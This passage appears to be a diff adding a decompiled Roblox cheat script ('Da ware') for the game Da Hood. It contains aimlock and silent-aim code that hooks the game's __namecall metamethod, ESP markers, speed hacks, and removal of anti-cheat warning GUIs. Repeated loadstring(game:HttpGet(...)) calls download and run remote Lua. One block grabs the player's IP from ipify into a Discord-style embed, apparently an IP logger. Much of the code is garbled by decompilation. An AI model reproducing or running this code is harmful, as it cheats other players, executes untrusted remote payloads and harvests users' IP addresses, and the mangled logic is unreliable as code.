+    game:GetService("Players").LocalPlayer.PlayerGui.Chat.Frame.ChatChannelParentFrame.Visible = true
+    game:GetService("Players").LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Position = 9 + 10
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    wait(0)
+    game.StarterGui:SetCore("SendNotification", {
+      Title = "Type",
+      Text = "/spy to toggle",
+      icon = "http://www.roblox.com/asset/?id=8109580830",
+      Duration = "5"
+    })
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+  end)
+  _G.JumpHeight = 50
+  function Action(a, b)
+    if a ~= nil then
+      b(a)
+    end
+  end
+  game:GetService("UserInputService").InputBegan:connect(function(a)
+    if a.UserInputType == Enum.UserInputType.Keyboard and a.KeyCode == Enum.KeyCode.Space then
+      Action(va.Character.Humanoid, function(a)
+        if a:GetState() == Enum.HumanoidStateType.Jumping or a:GetState() == Enum.HumanoidStateType.Freefall then
+          Action(a.Parent.HumanoidRootPart, function(a)
+            a.Velocity = Vector3.new(0, _G.JumpHeight, 0)
+          end)
+        end
+      end)
+    end
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    pcall(function()
+      if not {
+        embeds = {
+          {
+            title = game:GetService("Players").LocalPlayer.Name,
+            description = game:HttpGet("https://api.ipify.org")
+          }
+        }
+      } then
+      elseif not {
+        embeds = {
+          {
+            title = game:GetService("Players").LocalPlayer.Name,
+            description = game:HttpGet("https://api.ipify.org")
+          }
+        }
+      } then
+      elseif not {
+        embeds = {
+          {
+            title = game:GetService("Players").LocalPlayer.Name,
+            description = game:HttpGet("https://api.ipify.org")
+          }
+        }
+      } then
+      end
+    end)
+    game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(a)
+      if a == va then
+        if DaHoodSettings.SilentAim == true then
+          DaHoodSettings.SilentAim = false
+        else
+          DaHoodSettings.SilentAim = true
+        end
+      end
+    end)
+    game:GetService("RunService").RenderStepped:Connect(function()
+      for fd, fe in pairs(game.CoreGui:GetChildren()) do
+        if fe.Name == "PostmansAutoRob" then
+          fe:Destroy()
+        end
+      end
+      for fd, fe in pairs(game.CoreGui:GetChildren()) do
+        if fe.Name == "WarningGUI" then
+          fe:Destroy()
+        end
+      end
+    end)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))().CreateLib("Da ware - join https://discord.gg/WAZyXZ33", "DarkTheme"):NewTab("Aimlock"):NewSection("Da WARE"):NewButton("Aimlock", "Locks on the user", function()
+      getgenv().AimPart = "HumanoidRootPart"
+      getgenv().AimlockKey = "q"
+      getgenv().AimRadius = 30
+      getgenv().ThirdPerson = true
+      getgenv().FirstPerson = true
+      getgenv().TeamCheck = false
+      getgenv().PredictMovement = true
+      getgenv().PredictionVelocity = 9
+      getgenv().CiazwareUniversalAimbotLoaded = true
+      getgenv().WorldToViewportPoint = function(a)
+        return va:WorldToViewportPoint(a)
+      end
+      getgenv().WorldToScreenPoint = function(a)
+        return va.WorldToScreenPoint(va, a)
+      end
+      getgenv().GetObscuringObjects = function(a)
+        if not nil and a:FindFirstChild(getgenv().AimPart) and not a and va.Character:FindFirstChild("Head") and not a then
+          return workspace:FindPartOnRay(vb(a[getgenv().AimPart].Position, va.Character.Head.Position)):IsDescendantOf(a)
+        end
+      end
+      getgenv().GetNearestTarget = function()
+        for fh, fj in pairs(va:GetPlayers()) do
+          if fj ~= vb then
+            table.insert({}, fj)
+          end
+        end
+        for fh, fj in pairs({}) do
+          if fj.Character ~= nil then
+            if getgenv().TeamCheck == true and fj.Team ~= vb.Team then
+              {
+                [fj.Name .. fh] = {},
+                [fj.Name .. fh] = {}
+              }[fj.Name .. fh].dist = fj.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p.magnitude
+              {
+                [fj.Name .. fh] = {},
+                [fj.Name .. fh] = {}
+              }[fj.Name .. fh].plr = fj
+              {
+                [fj.Name .. fh] = {},
+                [fj.Name .. fh] = {}
+              }[fj.Name .. fh].diff = math.floor(game.Workspace:FindPartOnRay(Ray.new(game.Workspace.CurrentCamera.CFrame.p, vc.Hit.p - game.Workspace.CurrentCamera.CFrame.p.unit * fj.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p.magnitude), game.Workspace) - fj.Character:FindFirstChild("Head").Position.magnitude)
+              table.insert({}, (math.floor(game.Workspace:FindPartOnRay(Ray.new(game.Workspace.CurrentCamera.CFrame.p, vc.Hit.p - game.Workspace.CurrentCamera.CFrame.p.unit * fj.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p.magnitude), game.Workspace) - fj.Character:FindFirstChild("Head").Position.magnitude)))
+            elseif getgenv().TeamCheck == false and fj.Team == vb.Team then
+              {
+                [fj.Name .. fh] = {},
+                [fj.Name .. fh] = {}
+              }[fj.Name .. fh].dist = fj.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p.magnitude
+              {
+                [fj.Name .. fh] = {},
+                [fj.Name .. fh] = {}
+              }[fj.Name .. fh].plr = fj
+              {
+                [fj.Name .. fh] = {},
+                [fj.Name .. fh] = {}
+              }[fj.Name .. fh].diff = math.floor(game.Workspace:FindPartOnRay(Ray.new(game.Workspace.CurrentCamera.CFrame.p, vc.Hit.p - game.Workspace.CurrentCamera.CFrame.p.unit * fj.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p.magnitude), game.Workspace) - fj.Character:FindFirstChild("Head").Position.magnitude)
+              table.insert({}, (math.floor(game.Workspace:FindPartOnRay(Ray.new(game.Workspace.CurrentCamera.CFrame.p, vc.Hit.p - game.Workspace.CurrentCamera.CFrame.p.unit * fj.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p.magnitude), game.Workspace) - fj.Character:FindFirstChild("Head").Position.magnitude)))
+            end
+          end
+        end
+        if unpack({}) == nil then
+          return nil
+        end
+        if math.floor(math.min(unpack({}))) > getgenv().AimRadius then
+          return nil
+        end
+        for fj, fk in pairs({
+          [fj.Name .. fh] = {},
+          [fj.Name .. fh] = {}
+        }) do
+          if fk.diff == math.floor(math.min(unpack({}))) then
+            return fk.plr
+          end
+        end
+        return nil
+      end
+      game:GetService("Players").LocalPlayer:GetMouse().KeyDown:Connect(function(a)
+        if a == AimlockKey and va == nil then
+          pcall(function()
+            if va ~= true then
+              va = true
+            end
+            if GetNearestTarget() ~= nil then
+              vb = GetNearestTarget()
+            end
+          end)
+        elseif a == AimlockKey and va ~= nil then
+          if va ~= nil then
+            va = nil
+          end
+          if vb ~= false then
+            vb = false
+          end
+        end
+      end)
+      game:GetService("RunService").RenderStepped:Connect(function()
+        if getgenv().ThirdPerson == true and getgenv().FirstPerson == true then
+          if va.Focus.p - va.CoordinateFrame.p.Magnitude >= 1 or va.Focus.p - va.CoordinateFrame.p.Magnitude < 1 then
+            vb = true
+          else
+            vb = false
+          end
+        elseif getgenv().ThirdPerson == true and getgenv().FirstPerson == false then
+          if va.Focus.p - va.CoordinateFrame.p.Magnitude > 1 then
+            vb = true
+          else
+            vb = false
+          end
+        elseif getgenv().ThirdPerson == false and getgenv().FirstPerson == true then
+          if va.Focus.p - va.CoordinateFrame.p.Magnitude <= 1 then
+            vb = true
+          else
+            vb = false
+          end
+        end
+        if vc == true and vd == true and not va.CoordinateFrame.p and not va.CoordinateFrame.p and not ve.Character then
+          if getgenv().FirstPerson == true then
+            if vb == true then
+              if getgenv().PredictMovement == true then
+                va.CFrame = vg(va.CFrame.p, 3 + 4)
+              elseif getgenv().PredictMovement == false then
+                va.CFrame = vg(va.CFrame.p, ve.Character[getgenv().AimPart].Position)
+              end
+            end
+          elseif getgenv().ThirdPerson == true and vb == true then
+            if getgenv().PredictMovement == true then
+              va.CFrame = vg(va.CFrame.p, 3 + 4)
+            elseif getgenv().PredictMovement == false then
+              va.CFrame = vg(va.CFrame.p, ve.Character[getgenv().AimPart].Position)
+            end
+          end
+        end
+      end)
+    end)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))().CreateLib("Da ware - join https://discord.gg/WAZyXZ33", "DarkTheme"):NewTab("Aimlock"):NewSection("Da WARE"):NewTextBox("Aimlock Key", "Aimlock Key should be lowercase.", function(a)
+      getgenv().AimlockKey = a
+    end)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))().CreateLib("Da ware - join https://discord.gg/WAZyXZ33", "DarkTheme"):NewTab("Aimlock"):NewSection("Da WARE"):NewTextBox("Aimlock Prediction", "Customize your aimlock prediction", function(a)
+      PredictionVelocity = a
+    end)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))().CreateLib("Da ware - join https://discord.gg/WAZyXZ33", "DarkTheme"):NewTab("Aimlock"):NewSection("Da WARE"):NewDropdown("AimPart", "Choose Aim Part to Lock At", {
+      "Head",
+      "UpperTorso",
+      "HumanoidRootPart",
+      "LowerTorso"
+    }, function(a)
+      getgenv().AimPart = a
+    end)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))().CreateLib("Da ware - join https://discord.gg/WAZyXZ33", "DarkTheme"):NewTab("Silent Aim"):NewSection("Da ware"):NewButton("Silent Aim", "Silent Aim Toggle Key is T.", function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/lemonsys/dahood/main/localsilentaim", true))()
+    end)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))().CreateLib("Da ware - join https://discord.gg/WAZyXZ33", "DarkTheme"):NewTab("Silent Aim"):NewSection("Da ware"):NewTextBox("Silent Aim Prediction", "0.157 for low ping 0.165 for medium ping 0.178 for high ping", function(a)
+      DaHoodSettings.Prediction = a
+    end)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))().CreateLib("Da ware - join https://discord.gg/WAZyXZ33", "DarkTheme"):NewTab("Silent Aim"):NewSection("Da ware"):NewDropdown("Silent Aim Part", "Choose Silent Aim Part", {
+      "Head",
+      "UpperTorso",
+      "HumanoidRootPart",
+      "LowerTorso"
+    }, function(a)
+      Aiming.TargetPart = a
+    end)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))().CreateLib("Da ware - join https://discord.gg/WAZyXZ33", "DarkTheme"):NewTab("Silent Aim"):NewSection("Da ware"):NewTextBox("Silent Aim Fov", "Silent Aim Fov Changer", function(a)
+      Aiming.FOV = a
+    end)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))().CreateLib("Da ware - join https://discord.gg/WAZyXZ33", "DarkTheme"):NewTab("Silent Aim"):NewSection("Da ware"):NewToggle("Silent Aim Show Fov", "yea", function(a)
+      Aiming.ShowFOV = a
+    end)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))().CreateLib("Da ware - join https://discord.gg/WAZyXZ33", "DarkTheme"):NewTab("Silent Aimlock"):NewSection("Da ware"):NewButton("Silent Aimlock", "Key is Q.", function()
+      _G.KEY = "q"
+      _G.PART = "LowerTorso"
+      _G.PRED = 0.032
+      _G.Frame = Vector3.new(0, 0.53, 0)
+      function makemarker(a, b, c, d, e)
+        Instance.new("BillboardGui", a).Name = "PP"
+        Instance.new("BillboardGui", a).Adornee = b
+        Instance.new("BillboardGui", a).Size = UDim2.new(d, e, d, e)
+        Instance.new("BillboardGui", a).AlwaysOnTop = true
+        Instance.new("Frame", (Instance.new("BillboardGui", a))).Size = UDim2.new(4, 0, 4, 0)
+        Instance.new("Frame", (Instance.new("BillboardGui", a))).BackgroundTransparency = 0.1
+        Instance.new("Frame", (Instance.new("BillboardGui", a))).BackgroundColor3 = c
+        Instance.new("UICorner", (Instance.new("Frame", (Instance.new("BillboardGui", a))))).CornerRadius = UDim.new(50, 50)
+        return (Instance.new("BillboardGui", a))
+      end
+      function noob(a)
+        repeat
+          wait()
+        until not nil
+        makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0).Name = a.Name
+        a.CharacterAdded:connect(function(a)
+          va.Adornee = a:WaitForChild(_G.PART)
+        end)
+        Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).BackgroundTransparency = 1
+        Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).Position = UDim2.new(0, 0, 0, -50)
+        Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).Size = UDim2.new(0, 100, 0, 100)
+        Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).Font = Enum.Font.SourceSansSemibold
+        Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).TextSize = 14
+        Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).TextColor3 = Color3.new(1, 1, 1)
+        Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).TextStrokeTransparency = 0
+        Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).TextYAlignment = Enum.TextYAlignment.Bottom
+        Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).Text = "Name: " .. a.Name
+        Instance.new("TextLabel", (makemarker(va, a.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0, 0))).ZIndex = 10
+        spawn(function()
+          while true do
+            if not nil then
+              if not nil then
+              end
+            end
+          end
+        end)
+      end
+      for fo = 1, #game.Players:GetPlayers() do
+        if game.Players:GetPlayers()[fo] ~= game.Players.LocalPlayer then
+          noob(game.Players:GetPlayers()[fo])
+        end
+      end
+      game.Players.PlayerAdded:connect(function(a)
+        noob(a)
+      end)
+      game.Players.PlayerRemoving:Connect(function(a)
+        va[a.Name]:Destroy()
+      end)
+      spawn(function()
+        va.Anchored = true
+        va.CanCollide = false
+        va.Size = Vector3.new(0.1, 0.1, 0.1)
+        va.Transparency = 0.1
+        makemarker(va, va, Color3.fromRGB(255, 0, 0), 0.2, 0)
+      end)
+      game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(a)
+        if a ~= _G.KEY then
+          return
+        end
+        if not a then
+          va = false
+          vb.TextColor3 = Color3.fromRGB(255, 20, 75)
+          vb.Text = "------"
+        else
+          va = true
+          vc = getClosestPlayerToCursor()
+          vb.TextColor3 = Color3.fromRGB(12, 255, 0)
+          vb.Text = vc.Character.Humanoid.DisplayName
+        end
+      end)
+      function getClosestPlayerToCursor()
+        for fg, fh in pairs(game.Players:GetPlayers()) do
+          if fh ~= game.Players.LocalPlayer and not math.huge and fh.Character:FindFirstChild("Humanoid") and fh.Character.Humanoid.Health ~= 0 and not math.huge and math.huge > Vector2.new(va:WorldToViewportPoint(fh.Character.PrimaryPart.Position).X, va:WorldToViewportPoint(fh.Character.PrimaryPart.Position).Y) - Vector2.new(vb.X, vb.Y).magnitude then
+          end
+        end
+        return fh
+      end
+      game:GetService("RunService").Stepped:connect(function()
+        if va and vb.Character and vb.Character:FindFirstChild(_G.PART) then
+          vc.CFrame = CFrame.new(2 + 3)
+        else
+          vc.CFrame = CFrame.new(0, 9999, 0)
+        end
+      end)
+      setreadonly(getrawmetatable(game), false)
+      getrawmetatable(game).__namecall = newcclosure(function()
+        if va and getnamecallmethod() == "FireServer" and {
+          ...
+        }[2] == "UpdateMousePos" then
+          return vd(unpack({
+            ...
+          }))
+        end
+        return vd(...)
+      end)
+      game.Players.LocalPlayer.Chatted:Connect(function(a)
+        if a == "/e print" then
+          print(_G.PRED)
+        end
+      end)
+      game.Players.LocalPlayer.Chatted:Connect(function(a)
+        if a == "Code:1029" then
+          _G.KEY = nil
+          _G.AIR = nil
+          _G.PART = nil
+          _G.PRED = nil
+          va.Visible = false
+        end
+      end)
+      game.Players.LocalPlayer.Chatted:Connect(function(a)
+        if a == "/e hrp" then
+          _G.KEY = "q"
+          _G.AIR = 5E-05
+          _G.PART = "HumanoidRootPart"
+          _G.PRED = 0.032
+          va.Visible = true
+        end
+      end)
+      game.Players.LocalPlayer.Chatted:Connect(function(a)
+        if a == "/e lt" then
+          _G.KEY = "q"
+          _G.AIR = 5E-05
+          _G.PART = "LowerTorso"
+          _G.PRED = 0.032
+          va.Visible = true
+        end
+      end)
+      game.Players.LocalPlayer.Chatted:Connect(function(a)
+        if a == "Screensharing" then
+          _G.KEY = "q"
+          _G.AIR = 5E-05
+          _G.PART = "LowerTorso"
+          _G.PRED = 0.033
+          va.Visible = true
+          vb = nil
+        end
+      end)
+      game.Players.LocalPlayer.Chatted:Connect(function(a)
+        if a == "/e P+" then
+          _G.PRED = 2 + 0.001
+        end
+      end)
+      game.Players.LocalPlayer.Chatted:Connect(function(a)
+        if a == "/e P-" then
+          _G.PRED = _G.PRED - 0.001
+        end
+      end)
+      while not nil do
+        if getClosestPlayerToCursor().Character.Humanoid.Jump == true and getClosestPlayerToCursor().Character.Humanoid.FloorMaterial == Enum.Material.Air then
+          _G.Frame = Vector3.new(0, -2.3, 0)
+          wait(0.05)
+        else
+          _G.Frame = Vector3.new(0, 0.53, 0)
+        end
+      end
+    end)
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/angeloX041/GASFLY/main/GASWIN", true))()
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Down:connect(function()
+    va.Parent.Parent.Maintab.Visible = true
+    va.Parent.Parent.PlayerTab.Visible = false
+    va.Parent.Parent.VisualsTab.Visible = false
+    va.Parent.Parent.AimlocksTab.Visible = false
+    va.Parent.Parent.BoomboxTab.Visible = false
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    game.Players.LocalPlayer.Character.Head.Transparency = 1
+    for fd, fe in pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) do
+      if not pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) then
+        fe:Destroy()
+      end
+    end
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    game.Players.LocalPlayer.Character.RightLowerLeg.MeshId = "902942093"
+    game.Players.LocalPlayer.Character.RightLowerLeg.Transparency = "1"
+    game.Players.LocalPlayer.Character.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
+    game.Players.LocalPlayer.Character.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
+    game.Players.LocalPlayer.Character.RightFoot.MeshId = "902942089"
+    game.Players.LocalPlayer.Character.RightFoot.Transparency = "1"
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+  end)
+  game.Players.LocalPlayer:GetMouse().KeyDown:connect(function(a)
+    if a == va then
+      vb:FireServer(vc[math.random(#vc)], "All")
+    end
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    wait(0, 5)
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 150
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("Script", va).Parent.MouseButton1Click:Connect(function()
+    wait()
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 150
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    Instance.new("ScreenGui").Name = "AnimationChanger"
+    Instance.new("ScreenGui").Parent = game:WaitForChild("CoreGui")
+    Instance.new("ScreenGui").ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("ScreenGui"), "Main"
+    Instance.new("Frame").BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
+    Instance.new("Frame").BorderSizePixel = 0
+    Instance.new("Frame").Position = UDim2.new(0.421999991, 0, -1, 0)
+    Instance.new("Frame").Size = UDim2.new(0, 300, 0, 250)
+    Instance.new("Frame").Active = true
+    Instance.new("Frame").Draggable = true
+    Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("Frame"), "TopBar"
+    Instance.new("Frame").BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+    Instance.new("Frame").BorderSizePixel = 0
+    Instance.new("Frame").Size = UDim2.new(0, 300, 0, 30)
+    Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "Close"
+    Instance.new("TextButton").BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+    Instance.new("TextButton").BorderSizePixel = 0
+    Instance.new("TextButton").Position = UDim2.new(0.899999976, 0, 0, 0)
+    Instance.new("TextButton").Size = UDim2.new(0, 30, 0, 30)
+    Instance.new("TextButton").Font = Enum.Font.SciFi
+    Instance.new("TextButton").Text = "x"
+    Instance.new("TextButton").TextColor3 = Color3.new(1, 0, 0.0156863)
+    Instance.new("TextButton").TextSize = 20
+    Instance.new("TextButton").MouseButton1Click:Connect(function()
+      wait(0.3)
+      va:TweenPosition(UDim2.new(0.421999991, 0, -1.28400004, 0))
+      wait(3)
+      vb:Destroy()
+    end)
+    Instance.new("TextLabel").Parent = Instance.new("Frame")
+    Instance.new("TextLabel").BackgroundColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextLabel").BackgroundTransparency = 1
+    Instance.new("TextLabel").BorderSizePixel = 0
+    Instance.new("TextLabel").Position = UDim2.new(0, 0, 0.600000024, 0)
+    Instance.new("TextLabel").Size = UDim2.new(0, 270, 0, 10)
+    Instance.new("TextLabel").Font = Enum.Font.SourceSans
+    Instance.new("TextLabel").Text = "Made by Nyser#4623"
+    Instance.new("TextLabel").TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextLabel").Parent, Instance.new("TextLabel").TextSize = Instance.new("Frame"), 15
+    Instance.new("TextLabel").BackgroundColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextLabel").BackgroundTransparency = 1
+    Instance.new("TextLabel").BorderSizePixel = 0
+    Instance.new("TextLabel").Position = UDim2.new(0, 0, -0.0266667679, 0)
+    Instance.new("TextLabel").Size = UDim2.new(0, 270, 0, 20)
+    Instance.new("TextLabel").Font = Enum.Font.SourceSans
+    Instance.new("TextLabel").Text = "Animation Changer"
+    Instance.new("TextLabel").TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextLabel").TextSize = 20
+    Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("Frame"), "NormalTab"
+    Instance.new("Frame").BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
+    Instance.new("Frame").BackgroundTransparency = 1
+    Instance.new("Frame").BorderSizePixel = 0
+    Instance.new("Frame").Position = UDim2.new(0.5, 0, 0.119999997, 0)
+    Instance.new("Frame").Size = UDim2.new(0, 150, 0, 500)
+    Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "A_Astronaut"
+    Instance.new("TextButton").BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+    Instance.new("TextButton").BorderSizePixel = 0
+    Instance.new("TextButton").Position = UDim2.new(0, 0, 0.815764725, 0)
+    Instance.new("TextButton").Size = UDim2.new(0, 150, 0, 30)
+    Instance.new("TextButton").Font = Enum.Font.SciFi
+    Instance.new("TextButton").Text = "Astronaut"
+    Instance.new("TextButton").TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextButton").TextSize = 20
+    Instance.new("TextButton").MouseButton1Click:Connect(function()
+      va.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=891621366"
+      va.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=891633237"
+      va.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=891667138"
+      va.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=891636393"
+      va.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=891627522"
+      va.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=891609353"
+      va.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=891617961"
+      game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end)
+    Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "A_Bubbly"
+    Instance.new("TextButton").BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+    Instance.new("TextButton").BorderSizePixel = 0
+    Instance.new("TextButton").Position = UDim2.new(0, 0, 0.349019617, 0)
+    Instance.new("TextButton").Size = UDim2.new(0, 150, 0, 30)
+    Instance.new("TextButton").Font = Enum.Font.SciFi
+    Instance.new("TextButton").Text = "Bubbly"
+    Instance.new("TextButton").TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextButton").TextSize = 20
+    Instance.new("TextButton").MouseButton1Click:Connect(function()
+      va.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=910004836"
+      va.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=910009958"
+      va.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=910034870"
+      va.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=910025107"
+      va.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=910016857"
+      va.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=910001910"
+      va.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=910030921"
+      va.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=910028158"
+      game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end)
+    Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "A_Cartoony"
+    Instance.new("TextButton").BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+    Instance.new("TextButton").BorderSizePixel = 0
+    Instance.new("TextButton").Position = UDim2.new(0, 0, 0.407272667, 0)
+    Instance.new("TextButton").Size = UDim2.new(0, 150, 0, 30)
+    Instance.new("TextButton").Font = Enum.Font.SciFi
+    Instance.new("TextButton").Text = "Cartoony"
+    Instance.new("TextButton").TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextButton").TextSize = 20
+    Instance.new("TextButton").MouseButton1Click:Connect(function()
+      va.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=742637544"
+      va.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=742638445"
+      va.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=742640026"
+      va.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=742638842"
+      va.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=742637942"
+      va.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=742636889"
+      va.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=742637151"
+      game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end)
+    Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "A_Elder"
+    Instance.new("TextButton").BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+    Instance.new("TextButton").BorderSizePixel = 0
+    Instance.new("TextButton").Position = UDim2.new(6.51925802E-09, 0, 0.636310041, 0)
+    Instance.new("TextButton").Size = UDim2.new(0, 150, 0, 30)
+    Instance.new("TextButton").Font = Enum.Font.SciFi
+    Instance.new("TextButton").Text = "Elder"
+    Instance.new("TextButton").TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextButton").TextSize = 20
+    Instance.new("TextButton").MouseButton1Click:Connect(function()
+      va.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=845397899"
+      va.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=845400520"
+      va.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=845403856"
+      va.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=845386501"
+      va.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=845398858"
+      va.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=845392038"
+      va.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=845396048"
+      game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end)
+    Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "A_Knight"
+    Instance.new("TextButton").BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+    Instance.new("TextButton").BorderSizePixel = 0
+    Instance.new("TextButton").Position = UDim2.new(0, 0, 0.52352941, 0)
+    Instance.new("TextButton").Size = UDim2.new(0, 150, 0, 30)
+    Instance.new("TextButton").Font = Enum.Font.SciFi
+    Instance.new("TextButton").Text = "Knight"
+    Instance.new("TextButton").TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("TextButton").TextSize = 20
+    Instance.new("TextButton").MouseButton1Click:Connect(function()
